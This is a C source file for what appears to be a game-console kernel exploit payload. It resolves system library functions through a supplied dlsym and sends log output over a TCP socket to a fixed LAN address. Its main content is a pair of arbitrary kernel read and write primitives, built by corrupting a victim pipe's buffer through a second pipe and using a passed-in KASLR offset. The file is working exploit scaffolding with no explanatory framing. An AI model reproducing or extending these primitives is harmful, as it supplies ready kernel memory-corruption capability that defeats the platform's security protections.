#include <errno.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>

#define LOG_IP "192.168.1.53"
#define LOG_PORT 1337

#define LIBC_MODULE_HANDLE 0x2
#define LIBKERNEL_MODULE_HANDLE 0x2001

#define PAGE_SIZE 0x4000

typedef int32_t SceKernelModule;

void *(*dlsym)(SceKernelModule handle, const char *symbol);

// libkernel functions

int *(*___error)(void);
int (*_accept)(int s, struct sockaddr *restrict addr,
               socklen_t *restrict addrlen);
int (*_bind)(int s, const struct sockaddr *addr, socklen_t addrlen);
int (*_close)(int fd);
int (*_connect)(int s, const struct sockaddr *name, socklen_t namelen);
int (*_inet_pton)(int af, const char *restrict src, void *restrict dst);
int (*_listen)(int s, int backlog);
void *(*_mmap)(void *addr, size_t len, int prot, int flags, int fd,
               off_t offset);
ssize_t (*_read)(int fd, void *buf, size_t nbytes);
int (*_socket)(int domain, int type, int protocol);
ssize_t (*_write)(int fd, const void *buf, size_t nbytes);

int *__error(void) { return ___error(); }

int accept(int s, struct sockaddr *restrict addr, socklen_t *restrict addrlen) {
  return _accept(s, addr, addrlen);
}

int bind(int s, const struct sockaddr *addr, socklen_t addrlen) {
  return _bind(s, addr, addrlen);
}

int close(int fd) { return _close(fd); }

int connect(int s, const struct sockaddr *name, socklen_t namelen) {
  return _connect(s, name, namelen);
}

int inet_pton(int af, const char *restrict src, void *restrict dst) {
  return _inet_pton(af, src, dst);
}

int listen(int s, int backlog) { return _listen(s, backlog); }

void *mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset) {
  return _mmap(addr, len, prot, flags, fd, offset);
}

ssize_t read(int fd, void *buf, size_t nbytes) {
  return _read(fd, buf, nbytes);
}

int socket(int domain, int type, int protocol) {
  return _socket(domain, type, protocol);
}

ssize_t write(int fd, const void *buf, size_t nbytes) {
  return _write(fd, buf, nbytes);
}

// libc functions

void *(*_calloc)(size_t number, size_t size);
int (*_fclose)(FILE *stream);
FILE *(*_fopen)(const char *restrict path, const char *restrict mode);
size_t (*_fread)(void *restrict ptr, size_t size, size_t nmemb,
                 FILE *restrict stream);
// void (*_free)(void *ptr);
int (*_fseek)(FILE *stream, long offset, int whence);
long (*_ftell)(FILE *stream);
// void *(*_malloc)(size_t size);
void *(*_memcpy)(void *dst, const void *src, size_t len);
void *(*_memset)(void *s, int c, size_t n);
void *(*_realloc)(void *ptr, size_t size);
char *(*_strcat)(char *restrict s, const char *restrict append);
char *(*_strchr)(const char *s, int c);
char *(*_strrchr)(const char *s, int c);
int (*_strcmp)(const char *s1, const char *s2);
char *(*_strcpy)(char *restrict dst, const char *restrict src);
size_t (*_strlen)(const char *s);
int (*_strncmp)(const char *s1, const char *s2, size_t len);
int (*_vsnprintf)(char *restrict str, size_t size, const char *restrict format,
                  va_list ap);

void *calloc(size_t number, size_t size) { return _calloc(number, size); }

int fclose(FILE *stream) { return _fclose(stream); }

FILE *fopen(const char *restrict path, const char *restrict mode) {
  return _fopen(path, mode);
}

size_t fread(void *restrict ptr, size_t size, size_t nmemb,
             FILE *restrict stream) {
  return _fread(ptr, size, nmemb, stream);
}

// void free(void *ptr) { _free(ptr); }

int fseek(FILE *stream, long offset, int whence) {
  return _fseek(stream, offset, whence);
}

long ftell(FILE *stream) { return _ftell(stream); }

// void *malloc(size_t size) { return _malloc(size); }

void *memcpy(void *dst, const void *src, size_t len) {
  return _memcpy(dst, src, len);
}

void *memset(void *s, int c, size_t n) { return _memset(s, c, n); }

void *realloc(void *ptr, size_t size) { return _realloc(ptr, size); }

int snprintf(char *restrict str, size_t size, const char *restrict format,
             ...) {
  int r;
  va_list args;
  va_start(args, format);
  r = vsnprintf(str, size, format, args);
  va_end(args);
  return r;
}

char *strcat(char *restrict s, const char *restrict append) {
  return _strcat(s, append);
}

int strcmp(const char *s1, const char *s2) { return _strcmp(s1, s2); }

char *strchr(const char *s, int c) { return _strchr(s, c); }

char *strrchr(const char *s, int c) { return _strrchr(s, c); }

char *strcpy(char *restrict dst, const char *restrict src) {
  return _strcpy(dst, src);
}

size_t strlen(const char *s) { return _strlen(s); }

int strncmp(const char *s1, const char *s2, size_t len) {
  return _strncmp(s1, s2, len);
}

int vsnprintf(char *restrict str, size_t size, const char *restrict format,
              va_list ap) {
  return _vsnprintf(str, size, format, ap);
}

void resolve_imports(void) {
#define LIBKERNEL_RESOLVE(name) _##name = dlsym(LIBKERNEL_MODULE_HANDLE, #name)
  LIBKERNEL_RESOLVE(__error);
  LIBKERNEL_RESOLVE(accept);
  LIBKERNEL_RESOLVE(bind);
  LIBKERNEL_RESOLVE(close);
  LIBKERNEL_RESOLVE(connect);
  LIBKERNEL_RESOLVE(inet_pton);
  LIBKERNEL_RESOLVE(listen);
  LIBKERNEL_RESOLVE(mmap);
  LIBKERNEL_RESOLVE(read);
  LIBKERNEL_RESOLVE(socket);
  LIBKERNEL_RESOLVE(write);
#undef LIBKERNEL_RESOLVE

#define LIBC_RESOLVE(name) _##name = dlsym(LIBC_MODULE_HANDLE, #name)
  LIBC_RESOLVE(calloc);
  LIBC_RESOLVE(fclose);
  LIBC_RESOLVE(fopen);
  LIBC_RESOLVE(fread);
  // LIBC_RESOLVE(free);
  free = dlsym(LIBC_MODULE_HANDLE, "free");
  LIBC_RESOLVE(fseek);
  LIBC_RESOLVE(ftell);
  // LIBC_RESOLVE(malloc);
  malloc = dlsym(LIBC_MODULE_HANDLE, "malloc");
  LIBC_RESOLVE(memcpy);
  LIBC_RESOLVE(memset);
  LIBC_RESOLVE(realloc);
  LIBC_RESOLVE(strcat);
  LIBC_RESOLVE(strchr);
  LIBC_RESOLVE(strrchr);
  LIBC_RESOLVE(strcmp);
  LIBC_RESOLVE(strcpy);
  LIBC_RESOLVE(strlen);
  LIBC_RESOLVE(strncmp);
  LIBC_RESOLVE(vsnprintf);
#undef LIBC_RESOLVE
}

int log_sock = -1;

int printf(const char *__restrict fmt, ...) {
  va_list list;
  char str[1024];

  va_start(list, fmt);
  vsnprintf(str, sizeof(str), fmt, list);
  va_end(list);

  write(log_sock, str, strlen(str));

  return 0;
}

int puts(const char *str) {
  write(log_sock, str, strlen(str));
  write(log_sock, "\n", 1);
  return 0;
}

int init_log(void) {
  int ret;

  int s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0)
    return s;

  struct sockaddr_in sin;
  memset(&sin, 0, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_port = htons(LOG_PORT);
  ret = inet_pton(AF_INET, LOG_IP, &sin.sin_addr);
  if (ret < 0)
    return ret;

  ret = connect(s, (struct sockaddr *)&sin, sizeof(sin));
  if (ret < 0)
    return ret;

  log_sock = s;

  return 0;
}

void shutdown_log(void) { close(log_sock); }

typedef struct {
  void *dlsym;
  uint64_t kaslr_offset;
  int *master_pipe_fd;
  int *victim_pipe_fd;
} PayloadArgs;

PayloadArgs *payload_args;

struct pipebuf {
  uint32_t cnt;
  uint32_t in;
  uint32_t out;
  uint32_t size;
  uintptr_t buffer;
};

int corrupt_pipebuf(uint32_t cnt, uint32_t in, uint32_t out, uint32_t size,
                    uintptr_t buffer) {
  struct pipebuf buf = {};
  buf.cnt = cnt;
  buf.in = in;
  buf.out = out;
  buf.size = size;
  buf.buffer = buffer;
  write(payload_args->master_pipe_fd[1], &buf, sizeof(buf));
  return read(payload_args->master_pipe_fd[0], &buf, sizeof(buf));
}

int kread(void *dest, uintptr_t src, size_t n) {
  corrupt_pipebuf(n, 0, 0, PAGE_SIZE, src);
  return read(payload_args->victim_pipe_fd[0], dest, n);
}

int kwrite(uintptr_t dest, const void *src, size_t n) {
  corrupt_pipebuf(0, 0, 0, PAGE_SIZE, dest);
  return write(payload_args->victim_pipe_fd[1], src, n);
}

uint8_t kread8(uintptr_t addr) {
  uint8_t val = 0;
  kread(&val, addr, sizeof(val));
  return val;
}

uint16_t kread16(uintptr_t addr) {
  uint16_t val = 0;
  kread(&val, addr, sizeof(val));
  return val;
}

uint32_t kread32(uintptr_t addr) {
  uint32_t val = 0;
  kread(&val, addr, sizeof(val));
  return val;
}

uint64_t kread64(uintptr_t addr) {
  uint64_t val = 0;
  kread(&val, addr, sizeof(val));
  return val;
}

void kwrite8(uintptr_t addr, uint8_t val) { kwrite(addr, &val, sizeof(val)); }

void kwrite16(uintptr_t addr, uint16_t val) { kwrite(addr, &val, sizeof(val)); }

void kwrite32(uintptr_t addr, uint32_t val) { kwrite(addr, &val, sizeof(val)); }

void kwrite64(uintptr_t addr, uint64_t val) { kwrite(addr, &val, sizeof(val)); }

int payload(PayloadArgs *args) {
  int ret;

  payload_args = args;
  dlsym = args->dlsym;

  resolve_imports();

  ret = init_log();
  if (ret < 0)
    return errno;

  printf("[+] Payload entered\n");

  shutdown_log();

  return 0;
}
